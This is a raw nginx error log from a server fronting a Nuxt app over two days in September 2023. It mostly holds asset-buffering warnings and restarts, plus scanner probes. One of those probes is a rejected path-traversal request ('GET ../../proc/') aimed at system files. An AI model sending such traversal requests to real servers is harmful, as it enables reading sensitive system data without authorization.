2023/09/18 12:44:57 [warn] 23#23: *41 an upstream response is buffered to a temporary file /var/cache/nginx/proxy_temp/4/00/0000000004 while reading upstream, client: 103.77.186.50, server: _, request: "GET /_nuxt/pizza-opacity.3f1e980f.png HTTP/1.1", upstream: "http://85.31.238.178:3000/_nuxt/pizza-opacity.3f1e980f.png", host: "85.31.238.178", referrer: "http://85.31.238.178/"
2023/09/18 12:44:57 [warn] 23#23: *2 an upstream response is buffered to a temporary file /var/cache/nginx/proxy_temp/5/00/0000000005 while reading upstream, client: 103.77.186.50, server: _, request: "GET /_nuxt/pizza-opacity.3f1e980f.png HTTP/1.1", upstream: "http://85.31.238.178:3000/_nuxt/pizza-opacity.3f1e980f.png", host: "85.31.238.178", referrer: "http://85.31.238.178/"
2023/09/18 12:44:58 [info] 23#23: *41 client 103.77.186.50 closed keepalive connection
2023/09/18 12:44:58 [info] 23#23: *2 client prematurely closed connection while sending to client, client: 103.77.186.50, server: _, request: "GET /_nuxt/pizza-opacity.3f1e980f.png HTTP/1.1", upstream: "http://85.31.238.178:3000/_nuxt/pizza-opacity.3f1e980f.png", host: "85.31.238.178", referrer: "http://85.31.238.178/"
2023/09/18 12:44:58 [warn] 23#23: *40 an upstream response is buffered to a temporary file /var/cache/nginx/proxy_temp/6/00/0000000006 while reading upstream, client: 103.77.186.50, server: _, request: "GET /_nuxt/entry.b64944a1.js HTTP/1.1", upstream: "http://85.31.238.178:3000/_nuxt/entry.b64944a1.js", host: "85.31.238.178"
2023/09/18 12:44:58 [warn] 23#23: *42 an upstream response is buffered to a temporary file /var/cache/nginx/proxy_temp/7/00/0000000007 while reading upstream, client: 103.77.186.50, server: _, request: "GET /_nuxt/pizza-opacity.3f1e980f.png HTTP/1.1", upstream: "http://85.31.238.178:3000/_nuxt/pizza-opacity.3f1e980f.png", host: "85.31.238.178", referrer: "http://85.31.238.178/"
2023/09/18 12:44:58 [warn] 23#23: *43 an upstream response is buffered to a temporary file /var/cache/nginx/proxy_temp/8/00/0000000008 while reading upstream, client: 103.77.186.50, server: _, request: "GET /_nuxt/pizza-opacity.3f1e980f.png HTTP/1.1", upstream: "http://85.31.238.178:3000/_nuxt/pizza-opacity.3f1e980f.png", host: "85.31.238.178", referrer: "http://85.31.238.178/"
2023/09/18 12:44:59 [info] 23#23: *42 client 103.77.186.50 closed keepalive connection
2023/09/18 12:44:59 [info] 23#23: *43 client prematurely closed connection while sending to client, client: 103.77.186.50, server: _, request: "GET /_nuxt/pizza-opacity.3f1e980f.png HTTP/1.1", upstream: "http://85.31.238.178:3000/_nuxt/pizza-opacity.3f1e980f.png", host: "85.31.238.178", referrer: "http://85.31.238.178/"
2023/09/18 12:44:59 [warn] 23#23: *66 an upstream response is buffered to a temporary file /var/cache/nginx/proxy_temp/9/00/0000000009 while reading upstream, client: 103.77.186.50, server: _, request: "GET /_nuxt/entry.b64944a1.js HTTP/1.1", upstream: "http://85.31.238.178:3000/_nuxt/entry.b64944a1.js", host: "85.31.238.178", referrer: "http://85.31.238.178/"
2023/09/18 12:45:00 [warn] 23#23: *90 an upstream response is buffered to a temporary file /var/cache/nginx/proxy_temp/0/01/0000000010 while reading upstream, client: 103.77.186.50, server: _, request: "GET /_nuxt/pizza-opacity.3f1e980f.png HTTP/1.1", upstream: "http://85.31.238.178:3000/_nuxt/pizza-opacity.3f1e980f.png", host: "85.31.238.178", referrer: "http://85.31.238.178/"
2023/09/18 12:45:00 [warn] 23#23: *66 an upstream response is buffered to a temporary file /var/cache/nginx/proxy_temp/1/01/0000000011 while reading upstream, client: 103.77.186.50, server: _, request: "GET /_nuxt/pizza-opacity.3f1e980f.png HTTP/1.1", upstream: "http://85.31.238.178:3000/_nuxt/pizza-opacity.3f1e980f.png", host: "85.31.238.178", referrer: "http://85.31.238.178/"
2023/09/18 12:45:01 [warn] 23#23: *112 an upstream response is buffered to a temporary file /var/cache/nginx/proxy_temp/2/01/0000000012 while reading upstream, client: 103.77.186.50, server: _, request: "GET /_nuxt/pizza-opacity.3f1e980f.png HTTP/1.1", upstream: "http://85.31.238.178:3000/_nuxt/pizza-opacity.3f1e980f.png", host: "85.31.238.178"
2023/09/18 12:45:01 [warn] 23#23: *90 an upstream response is buffered to a temporary file /var/cache/nginx/proxy_temp/3/01/0000000013 while reading upstream, client: 103.77.186.50, server: _, request: "GET /_nuxt/pizza-opacity.3f1e980f.png HTTP/1.1", upstream: "http://85.31.238.178:3000/_nuxt/pizza-opacity.3f1e980f.png", host: "85.31.238.178", referrer: "http://85.31.238.178/"
2023/09/18 12:45:02 [warn] 23#23: *37 an upstream response is buffered to a temporary file /var/cache/nginx/proxy_temp/4/01/0000000014 while reading upstream, client: 103.77.186.50, server: _, request: "GET /_nuxt/pizza-opacity.3f1e980f.png HTTP/1.1", upstream: "http://85.31.238.178:3000/_nuxt/pizza-opacity.3f1e980f.png", host: "85.31.238.178", referrer: "http://85.31.238.178/"
2023/09/18 12:45:03 [info] 23#23: *37 client 103.77.186.50 closed keepalive connection
2023/09/18 12:45:03 [warn] 23#23: *67 an upstream response is buffered to a temporary file /var/cache/nginx/proxy_temp/5/01/0000000015 while reading upstream, client: 103.77.186.50, server: _, request: "GET /_nuxt/pizza-opacity.3f1e980f.png HTTP/1.1", upstream: "http://85.31.238.178:3000/_nuxt/pizza-opacity.3f1e980f.png", host: "85.31.238.178", referrer: "http://85.31.238.178/"
2023/09/18 12:45:05 [warn] 23#23: *88 an upstream response is buffered to a temporary file /var/cache/nginx/proxy_temp/6/01/0000000016 while reading upstream, client: 103.77.186.50, server: _, request: "GET /_nuxt/pizza-opacity.3f1e980f.png HTTP/1.1", upstream: "http://85.31.238.178:3000/_nuxt/pizza-opacity.3f1e980f.png", host: "85.31.238.178", referrer: "http://85.31.238.178/"
2023/09/18 12:45:06 [info] 23#23: *88 client 103.77.186.50 closed keepalive connection
2023/09/18 12:45:06 [warn] 23#23: *134 an upstream response is buffered to a temporary file /var/cache/nginx/proxy_temp/7/01/0000000017 while reading upstream, client: 103.77.186.50, server: _, request: "GET /_nuxt/entry.b64944a1.js HTTP/1.1", upstream: "http://85.31.238.178:3000/_nuxt/entry.b64944a1.js", host: "85.31.238.178", referrer: "http://85.31.238.178/"
2023/09/18 12:45:06 [warn] 23#23: *40 an upstream response is buffered to a temporary file /var/cache/nginx/proxy_temp/8/01/0000000018 while reading upstream, client: 103.77.186.50, server: _, request: "GET /_nuxt/pizza-opacity.3f1e980f.png HTTP/1.1", upstream: "http://85.31.238.178:3000/_nuxt/pizza-opacity.3f1e980f.png", host: "85.31.238.178", referrer: "http://85.31.238.178/"
2023/09/18 12:45:07 [info] 23#23: *40 client prematurely closed connection while sending to client, client: 103.77.186.50, server: _, request: "GET /_nuxt/pizza-opacity.3f1e980f.png HTTP/1.1", upstream: "http://85.31.238.178:3000/_nuxt/pizza-opacity.3f1e980f.png", host: "85.31.238.178", referrer: "http://85.31.238.178/"
2023/09/18 12:45:08 [warn] 23#23: *177 an upstream response is buffered to a temporary file /var/cache/nginx/proxy_temp/9/01/0000000019 while reading upstream, client: 103.77.186.50, server: _, request: "GET /_nuxt/pizza-opacity.3f1e980f.png HTTP/1.1", upstream: "http://85.31.238.178:3000/_nuxt/pizza-opacity.3f1e980f.png", host: "85.31.238.178", referrer: "http://85.31.238.178/"
2023/09/18 12:45:10 [warn] 23#23: *134 an upstream response is buffered to a temporary file /var/cache/nginx/proxy_temp/0/02/0000000020 while reading upstream, client: 103.77.186.50, server: _, request: "GET /_nuxt/pizza-opacity.3f1e980f.png HTTP/1.1", upstream: "http://85.31.238.178:3000/_nuxt/pizza-opacity.3f1e980f.png", host: "85.31.238.178", referrer: "http://85.31.238.178/"
2023/09/18 12:45:11 [info] 23#23: *134 client prematurely closed connection while sending to client, client: 103.77.186.50, server: _, request: "GET /_nuxt/pizza-opacity.3f1e980f.png HTTP/1.1", upstream: "http://85.31.238.178:3000/_nuxt/pizza-opacity.3f1e980f.png", host: "85.31.238.178", referrer: "http://85.31.238.178/"
2023/09/18 12:45:11 [info] 23#23: *67 client 103.77.186.50 closed keepalive connection (104: Connection reset by peer)
2023/09/18 12:45:11 [warn] 23#23: *239 an upstream response is buffered to a temporary file /var/cache/nginx/proxy_temp/1/02/0000000021 while reading upstream, client: 103.77.186.50, server: _, request: "GET /_nuxt/pizza-opacity.3f1e980f.png HTTP/1.1", upstream: "http://85.31.238.178:3000/_nuxt/pizza-opacity.3f1e980f.png", host: "85.31.238.178", referrer: "http://85.31.238.178/"
2023/09/18 12:48:55 [info] 23#23: *262 client timed out (110: Connection timed out) while waiting for request, client: 103.77.186.50, server: 0.0.0.0:80
2023/09/18 12:48:55 [info] 23#23: *263 client timed out (110: Connection timed out) while waiting for request, client: 103.77.186.50, server: 0.0.0.0:80
2023/09/18 13:05:17 [info] 23#23: *264 client 5.235.243.89 closed keepalive connection
2023/09/18 13:11:19 [info] 23#23: *266 client 43.247.160.31 closed keepalive connection
2023/09/18 13:14:15 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
2023/09/18 13:14:15 [notice] 23#23: gracefully shutting down
2023/09/18 13:14:15 [notice] 23#23: exiting
2023/09/18 13:14:15 [notice] 23#23: exit
2023/09/18 13:14:15 [notice] 1#1: signal 17 (SIGCHLD) received from 23
2023/09/18 13:14:15 [notice] 1#1: worker process 23 exited with code 0
2023/09/18 13:14:15 [notice] 1#1: exit
2023/09/18 13:14:32 [notice] 1#1: using the "epoll" event method
2023/09/18 13:14:32 [notice] 1#1: nginx/1.25.2
2023/09/18 13:14:32 [notice] 1#1: built by gcc 12.2.0 (Debian 12.2.0-14) 
2023/09/18 13:14:32 [notice] 1#1: OS: Linux 5.15.0-1041-kvm
2023/09/18 13:14:32 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
2023/09/18 13:14:32 [notice] 1#1: start worker processes
2023/09/18 13:14:32 [notice] 1#1: start worker process 22
2023/09/18 13:14:51 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
2023/09/18 13:14:51 [notice] 22#22: gracefully shutting down
2023/09/18 13:14:51 [notice] 22#22: exiting
2023/09/18 13:14:51 [notice] 22#22: exit
2023/09/18 13:14:51 [notice] 1#1: signal 17 (SIGCHLD) received from 22
2023/09/18 13:14:51 [notice] 1#1: worker process 22 exited with code 0
2023/09/18 13:14:51 [notice] 1#1: exit
2023/09/18 13:16:11 [notice] 1#1: using the "epoll" event method
2023/09/18 13:16:11 [notice] 1#1: nginx/1.25.2
2023/09/18 13:16:11 [notice] 1#1: built by gcc 12.2.0 (Debian 12.2.0-14) 
2023/09/18 13:16:11 [notice] 1#1: OS: Linux 5.15.0-1041-kvm
2023/09/18 13:16:11 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
2023/09/18 13:16:11 [notice] 1#1: start worker processes
2023/09/18 13:16:11 [notice] 1#1: start worker process 22
2023/09/18 13:24:18 [info] 22#22: *9 recv() failed (104: Connection reset by peer) while sending to client, client: 205.185.127.161, server: _, request: "GET / HTTP/1.1", upstream: "http://85.31.238.178:3000/", host: "85.31.238.178", referrer: "https://affgate.top/landing/aff/"
2023/09/18 13:31:20 [info] 22#22: *13 client timed out (110: Connection timed out) while waiting for request, client: 103.77.186.50, server: 0.0.0.0:80
2023/09/18 13:54:21 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
2023/09/18 13:54:21 [notice] 22#22: gracefully shutting down
2023/09/18 13:54:21 [notice] 22#22: exiting
2023/09/18 13:54:21 [notice] 22#22: exit
2023/09/18 13:54:21 [notice] 1#1: signal 17 (SIGCHLD) received from 22
2023/09/18 13:54:21 [notice] 1#1: worker process 22 exited with code 0
2023/09/18 13:54:21 [notice] 1#1: exit
2023/09/18 13:54:57 [notice] 1#1: using the "epoll" event method
2023/09/18 13:54:57 [notice] 1#1: nginx/1.25.2
2023/09/18 13:54:57 [notice] 1#1: built by gcc 12.2.0 (Debian 12.2.0-14) 
2023/09/18 13:54:57 [notice] 1#1: OS: Linux 5.15.0-1041-kvm
2023/09/18 13:54:57 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
2023/09/18 13:54:57 [notice] 1#1: start worker processes
2023/09/18 13:54:57 [notice] 1#1: start worker process 22
2023/09/18 14:19:30 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
2023/09/18 14:19:30 [notice] 22#22: gracefully shutting down
2023/09/18 14:19:30 [notice] 22#22: exiting
2023/09/18 14:19:30 [notice] 22#22: exit
2023/09/18 14:19:30 [notice] 1#1: signal 17 (SIGCHLD) received from 22
2023/09/18 14:19:30 [notice] 1#1: worker process 22 exited with code 0
2023/09/18 14:19:30 [notice] 1#1: exit
2023/09/18 14:24:01 [notice] 1#1: using the "epoll" event method
2023/09/18 14:24:01 [notice] 1#1: nginx/1.25.2
2023/09/18 14:24:01 [notice] 1#1: built by gcc 12.2.0 (Debian 12.2.0-14) 
2023/09/18 14:24:01 [notice] 1#1: OS: Linux 5.15.0-1041-kvm
2023/09/18 14:24:01 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
2023/09/18 14:24:01 [notice] 1#1: start worker processes
2023/09/18 14:24:01 [notice] 1#1: start worker process 23
2023/09/18 15:07:50 [info] 23#23: *1 recv() failed (104: Connection reset by peer) while waiting for request, client: 162.142.125.13, server: 0.0.0.0:80
2023/09/18 15:07:52 [info] 23#23: *2 client 162.142.125.13 closed keepalive connection (104: Connection reset by peer)
2023/09/18 15:07:52 [info] 23#23: *4 client 162.142.125.13 closed keepalive connection
2023/09/18 15:07:52 [info] 23#23: *6 client sent invalid request while reading client request line, client: 162.142.125.13, server: _, request: "PRI * HTTP/2.0"
2023/09/18 15:07:52 [info] 23#23: *6 recv() failed (104: Connection reset by peer) while reading client request line, client: 162.142.125.13, server: _, request: "PRI * HTTP/2.0"
2023/09/18 15:30:55 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
2023/09/18 15:30:55 [notice] 23#23: gracefully shutting down
2023/09/18 15:30:55 [notice] 23#23: exiting
2023/09/18 15:30:55 [notice] 23#23: exit
2023/09/18 15:30:55 [notice] 1#1: signal 17 (SIGCHLD) received from 23
2023/09/18 15:30:55 [notice] 1#1: worker process 23 exited with code 0
2023/09/18 15:30:55 [notice] 1#1: exit
2023/09/18 15:31:52 [notice] 1#1: using the "epoll" event method
2023/09/18 15:31:52 [notice] 1#1: nginx/1.25.2
2023/09/18 15:31:52 [notice] 1#1: built by gcc 12.2.0 (Debian 12.2.0-14) 
2023/09/18 15:31:52 [notice] 1#1: OS: Linux 5.15.0-1041-kvm
2023/09/18 15:31:52 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
2023/09/18 15:31:52 [notice] 1#1: start worker processes
2023/09/18 15:31:52 [notice] 1#1: start worker process 22
2023/09/18 16:04:32 [info] 22#22: *3 client sent invalid method while reading client request line, client: 178.62.1.147, server: _, request: "¸ ¯ö¬¨W"
2023/09/18 16:04:32 [info] 22#22: *3 recv() failed (104: Connection reset by peer) while reading client request line, client: 178.62.1.147, server: _, request: "¸ ¯ö¬¨W"
2023/09/18 16:08:24 [info] 22#22: *4 client sent invalid method while reading client request line, client: 34.83.204.230, server: _, request: " M  I∏j§äù¡ƒçï1Gñ{ˇ|ñ˛µ ®Â•r{ÚmÃ CdbñõmÒı[ßzü*Œ˜NàÄ÷ﬁ@D"
2023/09/18 16:59:38 [info] 22#22: *7 client 185.180.143.136 closed keepalive connection
2023/09/18 17:11:46 [info] 22#22: *9 client 189.216.42.36 closed keepalive connection
2023/09/18 17:17:23 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
2023/09/18 17:17:23 [notice] 22#22: gracefully shutting down
2023/09/18 17:17:23 [notice] 22#22: exiting
2023/09/18 17:17:23 [notice] 22#22: exit
2023/09/18 17:17:23 [notice] 1#1: signal 17 (SIGCHLD) received from 22
2023/09/18 17:17:23 [notice] 1#1: worker process 22 exited with code 0
2023/09/18 17:17:23 [notice] 1#1: exit
2023/09/18 17:25:10 [notice] 1#1: using the "epoll" event method
2023/09/18 17:25:10 [notice] 1#1: nginx/1.25.2
2023/09/18 17:25:10 [notice] 1#1: built by gcc 12.2.0 (Debian 12.2.0-14) 
2023/09/18 17:25:10 [notice] 1#1: OS: Linux 5.15.0-1041-kvm
2023/09/18 17:25:10 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
2023/09/18 17:25:10 [notice] 1#1: start worker processes
2023/09/18 17:25:10 [notice] 1#1: start worker process 23
2023/09/18 17:26:31 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
2023/09/18 17:26:31 [notice] 23#23: gracefully shutting down
2023/09/18 17:26:31 [notice] 23#23: exiting
2023/09/18 17:26:31 [notice] 23#23: exit
2023/09/18 17:26:31 [notice] 1#1: signal 17 (SIGCHLD) received from 23
2023/09/18 17:26:31 [notice] 1#1: worker process 23 exited with code 0
2023/09/18 17:26:31 [notice] 1#1: exit
2023/09/18 17:27:20 [notice] 1#1: using the "epoll" event method
2023/09/18 17:27:20 [notice] 1#1: nginx/1.25.2
2023/09/18 17:27:20 [notice] 1#1: built by gcc 12.2.0 (Debian 12.2.0-14) 
2023/09/18 17:27:20 [notice] 1#1: OS: Linux 5.15.0-1041-kvm
2023/09/18 17:27:20 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
2023/09/18 17:27:20 [notice] 1#1: start worker processes
2023/09/18 17:27:20 [notice] 1#1: start worker process 23
2023/09/18 17:28:12 [warn] 23#23: *1 an upstream response is buffered to a temporary file /var/cache/nginx/proxy_temp/1/00/0000000001 while reading upstream, client: 103.77.186.50, server: _, request: "GET /_nuxt/entry.d90be90f.js HTTP/1.1", upstream: "http://85.31.238.178:3000/_nuxt/entry.d90be90f.js", host: "85.31.238.178", referrer: "http://85.31.238.178/"
2023/09/18 17:50:04 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
2023/09/18 17:50:04 [notice] 23#23: gracefully shutting down
2023/09/18 17:50:04 [notice] 23#23: exiting
2023/09/18 17:50:04 [notice] 23#23: exit
2023/09/18 17:50:04 [notice] 1#1: signal 17 (SIGCHLD) received from 23
2023/09/18 17:50:04 [notice] 1#1: worker process 23 exited with code 0
2023/09/18 17:50:04 [notice] 1#1: exit
2023/09/18 17:50:53 [notice] 1#1: using the "epoll" event method
2023/09/18 17:50:53 [notice] 1#1: nginx/1.25.2
2023/09/18 17:50:53 [notice] 1#1: built by gcc 12.2.0 (Debian 12.2.0-14) 
2023/09/18 17:50:53 [notice] 1#1: OS: Linux 5.15.0-1041-kvm
2023/09/18 17:50:53 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
2023/09/18 17:50:53 [notice] 1#1: start worker processes
2023/09/18 17:50:53 [notice] 1#1: start worker process 23
2023/09/18 19:59:12 [warn] 23#23: *16 an upstream response is buffered to a temporary file /var/cache/nginx/proxy_temp/1/00/0000000001 while reading upstream, client: 16.171.52.72, server: _, request: "GET /_nuxt/entry.5739cbbc.js HTTP/1.1", upstream: "http://85.31.238.178:3000/_nuxt/entry.5739cbbc.js", host: "85.31.238.178"
2023/09/18 20:01:06 [warn] 23#23: *33 an upstream response is buffered to a temporary file /var/cache/nginx/proxy_temp/2/00/0000000002 while reading upstream, client: 16.171.52.72, server: _, request: "GET /_nuxt/entry.5739cbbc.js HTTP/1.1", upstream: "http://85.31.238.178:3000/_nuxt/entry.5739cbbc.js", host: "85.31.238.178"
2023/09/18 20:01:12 [info] 23#23: *40 client closed connection while waiting for request, client: 16.171.52.72, server: 0.0.0.0:80
2023/09/18 20:52:25 [info] 23#23: *54 client 188.214.200.163 closed keepalive connection
2023/09/18 23:24:51 [info] 23#23: *56 client 62.151.179.53 closed keepalive connection
2023/09/18 23:24:51 [info] 23#23: *58 client 62.151.179.53 closed keepalive connection
2023/09/19 00:26:16 [info] 23#23: *60 client 134.122.44.13 closed keepalive connection
2023/09/19 00:54:41 [info] 23#23: *62 client closed connection while waiting for request, client: 4.232.81.77, server: 0.0.0.0:80
2023/09/19 01:39:36 [info] 23#23: *63 recv() failed (104: Connection reset by peer) while waiting for request, client: 162.142.125.216, server: 0.0.0.0:80
2023/09/19 01:39:37 [info] 23#23: *64 client 162.142.125.216 closed keepalive connection (104: Connection reset by peer)
2023/09/19 01:39:37 [info] 23#23: *66 client 162.142.125.216 closed keepalive connection
2023/09/19 01:39:38 [info] 23#23: *68 client sent invalid request while reading client request line, client: 162.142.125.216, server: _, request: "PRI * HTTP/2.0"
2023/09/19 01:39:38 [info] 23#23: *68 recv() failed (104: Connection reset by peer) while reading client request line, client: 162.142.125.216, server: _, request: "PRI * HTTP/2.0"
2023/09/19 05:53:39 [info] 23#23: *79 client sent invalid method while reading client request line, client: 104.248.175.229, server: _, request: "¸ ¯„HNÙœ¡Éu\»n‹Æ<&õ*Xñ-T•MsîP∆ <ÃÃÃ¿0¿,¿(¿$¿¿"
2023/09/19 05:53:39 [info] 23#23: *79 recv() failed (104: Connection reset by peer) while reading client request line, client: 104.248.175.229, server: _, request: "¸ ¯„HNÙœ¡Éu\»n‹Æ<&õ*Xñ-T•MsîP∆ <ÃÃÃ¿0¿,¿(¿$¿¿"
2023/09/19 06:36:09 [info] 23#23: *80 client 104.219.232.122 closed keepalive connection
2023/09/19 07:50:12 [info] 23#23: *82 client sent HTTP/1.1 request without "Host" header while reading client request headers, client: 218.32.249.127, server: _, request: "GET / HTTP/1.1"
2023/09/19 08:09:27 [info] 23#23: *83 client 218.32.249.127 closed keepalive connection (104: Connection reset by peer)
2023/09/19 08:25:38 [info] 23#23: *85 client closed connection while waiting for request, client: 218.32.249.127, server: 0.0.0.0:80
2023/09/19 08:40:01 [warn] 23#23: *86 an upstream response is buffered to a temporary file /var/cache/nginx/proxy_temp/3/00/0000000003 while reading upstream, client: 49.36.210.89, server: _, request: "GET /_nuxt/entry.5739cbbc.js HTTP/1.1", upstream: "http://85.31.238.178:3000/_nuxt/entry.5739cbbc.js", host: "85.31.238.178", referrer: "http://85.31.238.178/"
2023/09/19 08:40:01 [warn] 23#23: *95 an upstream response is buffered to a temporary file /var/cache/nginx/proxy_temp/4/00/0000000004 while reading upstream, client: 49.36.210.89, server: _, request: "GET /_nuxt/pizza-opacity.3f1e980f.png HTTP/1.1", upstream: "http://85.31.238.178:3000/_nuxt/pizza-opacity.3f1e980f.png", host: "85.31.238.178", referrer: "http://85.31.238.178/"
2023/09/19 11:16:13 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
2023/09/19 11:16:13 [notice] 23#23: gracefully shutting down
2023/09/19 11:16:20 [info] 23#23: *108 client timed out (110: Connection timed out) while waiting for request, client: 103.77.186.50, server: 0.0.0.0:80
2023/09/19 11:16:20 [notice] 23#23: exiting
2023/09/19 11:16:20 [notice] 23#23: exit
2023/09/19 11:16:20 [notice] 1#1: signal 17 (SIGCHLD) received from 23
2023/09/19 11:16:20 [notice] 1#1: worker process 23 exited with code 0
2023/09/19 11:16:20 [notice] 1#1: exit
2023/09/19 11:16:41 [notice] 1#1: using the "epoll" event method
2023/09/19 11:16:41 [notice] 1#1: nginx/1.25.2
2023/09/19 11:16:41 [notice] 1#1: built by gcc 12.2.0 (Debian 12.2.0-14) 
2023/09/19 11:16:41 [notice] 1#1: OS: Linux 5.15.0-1041-kvm
2023/09/19 11:16:41 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
2023/09/19 11:16:41 [notice] 1#1: start worker processes
2023/09/19 11:16:41 [notice] 1#1: start worker process 23
2023/09/19 11:16:49 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
2023/09/19 11:16:49 [notice] 23#23: gracefully shutting down
2023/09/19 11:16:49 [notice] 23#23: exiting
2023/09/19 11:16:49 [notice] 23#23: exit
2023/09/19 11:16:49 [notice] 1#1: signal 17 (SIGCHLD) received from 23
2023/09/19 11:16:49 [notice] 1#1: worker process 23 exited with code 0
2023/09/19 11:16:49 [notice] 1#1: exit
2023/09/19 11:17:48 [notice] 1#1: using the "epoll" event method
2023/09/19 11:17:48 [notice] 1#1: nginx/1.25.2
2023/09/19 11:17:48 [notice] 1#1: built by gcc 12.2.0 (Debian 12.2.0-14) 
2023/09/19 11:17:48 [notice] 1#1: OS: Linux 5.15.0-1041-kvm
2023/09/19 11:17:48 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
2023/09/19 11:17:48 [notice] 1#1: start worker processes
2023/09/19 11:17:48 [notice] 1#1: start worker process 23
2023/09/19 12:07:14 [info] 23#23: *1 client sent invalid method while reading client request line, client: 218.32.249.127, server: _, request: " {  w·O^sú1Á˝"
2023/09/19 12:07:49 [info] 23#23: *2 client sent invalid method while reading client request line, client: 218.32.249.127, server: _, request: " {  wqŸîæ∫o∂ÎÎ≤ÛbÀ™: ¶™¨¯‚<!Ù¬ß2  ¿/¿+¿¿¿¿	¿¿"
2023/09/19 12:51:08 [info] 23#23: *3 client 20.216.160.159 closed keepalive connection
2023/09/19 12:51:09 [info] 23#23: *5 client 20.216.160.159 closed keepalive connection
2023/09/19 13:51:55 [info] 23#23: *9 client sent invalid request while reading client request line, client: 176.97.210.105, server: _, request: "GET ../../proc/ HTTP"
2023/09/19 14:31:37 [info] 23#23: *10 client 181.199.176.253 closed keepalive connection
2023/09/19 16:48:48 [info] 23#23: *12 client sent invalid method while reading client request line, client: 159.223.100.205, server: _, request: " Í  Êúó‹Å&¿	újîzjèa‰∞«ªH˙”"
2023/09/19 19:02:41 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
2023/09/19 19:02:41 [notice] 23#23: gracefully shutting down
2023/09/19 19:02:41 [notice] 23#23: exiting
2023/09/19 19:02:41 [notice] 23#23: exit
2023/09/19 19:02:41 [notice] 1#1: signal 17 (SIGCHLD) received from 23
2023/09/19 19:02:41 [notice] 1#1: worker process 23 exited with code 0
2023/09/19 19:02:41 [notice] 1#1: exit
2023/09/19 19:06:39 [notice] 1#1: using the "epoll" event method
2023/09/19 19:06:39 [notice] 1#1: nginx/1.25.2
2023/09/19 19:06:39 [notice] 1#1: built by gcc 12.2.0 (Debian 12.2.0-14) 
2023/09/19 19:06:39 [notice] 1#1: OS: Linux 5.15.0-1041-kvm
2023/09/19 19:06:39 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
2023/09/19 19:06:39 [notice] 1#1: start worker processes
2023/09/19 19:06:39 [notice] 1#1: start worker process 22
2023/09/19 19:09:51 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
2023/09/19 19:09:51 [notice] 22#22: gracefully shutting down
2023/09/19 19:09:51 [notice] 22#22: exiting
2023/09/19 19:09:51 [notice] 22#22: exit
2023/09/19 19:09:51 [notice] 1#1: signal 17 (SIGCHLD) received from 22
2023/09/19 19:09:51 [notice] 1#1: worker process 22 exited with code 0
2023/09/19 19:09:51 [notice] 1#1: exit
2023/09/19 19:10:51 [notice] 1#1: using the "epoll" event method
2023/09/19 19:10:51 [notice] 1#1: nginx/1.25.2
2023/09/19 19:10:51 [notice] 1#1: built by gcc 12.2.0 (Debian 12.2.0-14) 
2023/09/19 19:10:51 [notice] 1#1: OS: Linux 5.15.0-1041-kvm
2023/09/19 19:10:51 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
2023/09/19 19:10:51 [notice] 1#1: start worker processes
2023/09/19 19:10:51 [notice] 1#1: start worker process 22
2023/09/19 19:23:50 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
2023/09/19 19:23:50 [notice] 22#22: gracefully shutting down
2023/09/19 19:23:50 [notice] 22#22: exiting
2023/09/19 19:23:50 [notice] 22#22: exit
2023/09/19 19:23:50 [notice] 1#1: signal 17 (SIGCHLD) received from 22
2023/09/19 19:23:50 [notice] 1#1: worker process 22 exited with code 0
2023/09/19 19:23:50 [notice] 1#1: exit
2023/09/19 19:24:23 [notice] 1#1: using the "epoll" event method
2023/09/19 19:24:23 [notice] 1#1: nginx/1.25.2
2023/09/19 19:24:23 [notice] 1#1: built by gcc 12.2.0 (Debian 12.2.0-14) 
2023/09/19 19:24:23 [notice] 1#1: OS: Linux 5.15.0-1041-kvm
2023/09/19 19:24:23 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
2023/09/19 19:24:23 [notice] 1#1: start worker processes
2023/09/19 19:24:23 [notice] 1#1: start worker process 22
2023/09/19 19:40:23 [info] 22#22: *1 recv() failed (104: Connection reset by peer) while waiting for request, client: 167.248.133.49, server: 0.0.0.0:80
2023/09/19 19:40:26 [info] 22#22: *2 client 167.248.133.49 closed keepalive connection (104: Connection reset by peer)
2023/09/19 19:40:27 [info] 22#22: *4 client 167.248.133.49 closed keepalive connection
2023/09/19 19:40:28 [info] 22#22: *6 client sent invalid request while reading client request line, client: 167.248.133.49, server: _, request: "PRI * HTTP/2.0"
2023/09/19 19:40:29 [info] 22#22: *6 recv() failed (104: Connection reset by peer) while reading client request line, client: 167.248.133.49, server: _, request: "PRI * HTTP/2.0"
2023/09/19 19:41:30 [warn] 22#22: *9 an upstream response is buffered to a temporary file /var/cache/nginx/proxy_temp/1/00/0000000001 while reading upstream, client: 103.77.186.50, server: _, request: "GET /_nuxt/entry.5739cbbc.js HTTP/1.1", upstream: "http://85.31.238.178:3000/_nuxt/entry.5739cbbc.js", host: "85.31.238.178", referrer: "http://85.31.238.178/"
